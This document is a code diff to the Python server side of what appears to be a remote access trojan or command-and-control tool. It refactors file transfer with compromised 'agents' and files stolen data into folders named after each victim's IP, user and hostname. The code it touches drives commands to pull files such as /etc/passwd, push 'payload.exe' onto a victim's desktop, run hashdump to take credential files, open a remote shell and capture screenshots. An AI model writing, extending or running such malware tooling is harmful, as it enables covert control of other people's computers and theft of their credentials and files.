@@ -5,6 +5,8 @@ from symbols import *
 import select, datetime
 from prompt_toolkit import PromptSession
 
+DATA_CHUNK_SIZE = 1024
+
 
 class Server:
 
@@ -129,14 +131,7 @@ class Server:
                         self.commands[command_name]['function'](' '.join(args))
                     elif command_name in self.agent_commands:
                         if self.is_agent_selected():
-                            # Client download when server upload
-                            if command_name == 'upload':
-                                self.agent_commands["download"]['function'](' '.join(args))
-                            # Client upload when server download
-                            elif command_name == 'download':
-                                self.agent_commands["upload"]['function'](' '.join(args))
-                            else:
-                                self.agent_commands[command_name]['function'](' '.join(args))
+                            self.agent_commands[command_name]['function'](' '.join(args))
                     else:
                         print(f"Unknown command: {command_name}")
             except KeyboardInterrupt:
@@ -222,7 +217,7 @@ class Server:
         """
         try:
             with open(file_path, 'rb') as f:
-                while chunk := f.read(1024):
+                while chunk := f.read(DATA_CHUNK_SIZE):
                     self.current_agent.sock.sendall(chunk)
             self.current_agent.sock.sendall(SIG_EOF)
             print(f'File sent: {file_path} ({os.path.getsize(file_path)} b)')
@@ -233,37 +228,49 @@ class Server:
     def get_file(self, file_path):
         """
         generic function to get a file from the agent.
-        @param file_path: the path of the file to get
+        @param file_name: the path of the file to get
         """
-        file = os.path.basename(file_path)
         file_length = 0
         try:
-            with open(file, 'w+b') as f:
+            with open(file_path, 'w+b') as f:
                 while True:
-                    data = self.current_agent.sock.recv(1024)
+                    data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
                     if data == SIG_EOF or not data:
                         if file_length == 0:
                             print(f"WARNING: {file_path} is empty")
                         break
                     if data == FILE_NOT_FOUND:
                         print(f"ERROR: {file_path} not found on the target.")
-                        os.remove(file)
+                        os.remove(file_path)
                         return
                     elif data == ERROR_INSUFFICIENT_PERMS:
-                        print(f"ERROR: Insufficient permissions to get {file}.")
-                        os.remove(file)
+                        print(f"ERROR: Insufficient permissions to get {file_path}.")
+                        os.remove(file_path)
                         return
                     f.write(data)
                     file_length += len(data)
-            slash = ""
-            if self.platform == 'Linux':
-                slash = '/'
-            else:
-                slash = '\\'
-            print(f'File saved at {os.getcwd()}{slash}{file} ({file_length} b)')
+            print(f'File saved at {file_path} ({file_length} b)')
         except Exception as e:
             print(f"Error: {e}")
-            os.remove(file)
+            os.remove(file_path)
+
+    def get_file_without_path(self, remote_file_path):
+        self.download_folder_creation()
+        file_name = os.path.basename(remote_file_path)
+        full_path = os.path.join(self.get_download_folder_path(), file_name)
+        self.get_file(full_path)
+
+    def get_download_folder_path(self):
+        """Get the path of the folder where the downloaded files will be stored"""
+        folder_name = f"{self.current_agent.ip} - {self.current_agent.user}@{self.current_agent.hostname}"
+        return os.path.join(os.getcwd(), folder_name)
+
+    def download_folder_creation(self):
+        """Create a folder to store the downloaded files if it doesn't exist"""
+        full_local_path = self.get_download_folder_path()
+        # Check if the folder exists
+        if not os.path.exists(full_local_path):
+            os.mkdir(full_local_path)
 
     def is_socket_alive(self, sock):
         """Check if the agents are still alive by checking the readability of the socket"""
@@ -408,20 +415,20 @@ class Server:
     ####################################################################################################################
 
     def download(self, args):
-        self.current_agent.sock.sendall(f"download {args}".encode())
+        self.current_agent.sock.sendall(f"upload {args}".encode())
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) < 1:
             print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
             return
         for file_path in args:
-            self.get_file(file_path)
+            self.get_file_without_path(file_path)
 
     def upload(self, args):
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) < 2:
             print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
             return
-        self.current_agent.sock.sendall(f"upload {args[1]}".encode())
+        self.current_agent.sock.sendall(f"download {args[1]}".encode())
         self.send_file(args[0])
 
     def shell(self, args=None):
@@ -445,7 +452,7 @@ class Server:
             return
         self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
         while True:
-            data = self.current_agent.sock.recv(1024)
+            data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
             decoded_data = data.decode("latin1")
             if (data == SIG_EOF) or (not data):
                 break
@@ -472,7 +479,7 @@ class Server:
         # send the command to the agent
         self.current_agent.sock.sendall("hashdump".encode())
         for i in range(len(files)):
-            self.get_file(files[i])
+            self.get_file_without_path(files[i])
 
     def ipconfig(self, args=None):
         self.current_agent.sock.sendall("ipconfig".encode())
@@ -488,7 +495,7 @@ class Server:
             screen_path = f"{secrets.token_hex(5)}.jpg"
         with open(screen_path, 'wb') as f:
             while True:
-                data = self.current_agent.sock.recv(1024)
+                data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
                 if (data == SIG_EOF) or (not data):
                     break
                 f.write(data)
